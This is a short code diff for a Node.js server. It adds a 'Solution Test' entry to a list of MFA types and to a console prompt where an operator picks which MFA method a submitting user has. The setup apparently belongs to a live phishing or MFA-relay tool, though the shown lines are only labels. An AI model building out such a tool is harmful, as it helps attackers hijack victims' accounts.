@@ -58,6 +58,7 @@ app.post("/submit", async (req, res) => {
     0: "Invalid Account",
     1: "SMS", // covers all types of typed in passwords (TOTP/SMS/Call/Email)
     2: "Push Notification", // covers both push types
+    3: "Solution Test",
    }
 
    // handle request accordingly
@@ -120,7 +121,7 @@ function waitOnMFA() {
     output: process.stdout,
   });
 
-  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Push Notificaiton\nWhat MFA does the user have? "
+  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Push Notificaiton\n  3: Solution Test\nWhat MFA does the user have? "
   return new Promise(resolve => rl.question(query, ans => {
     rl.close();
     resolve(ans);
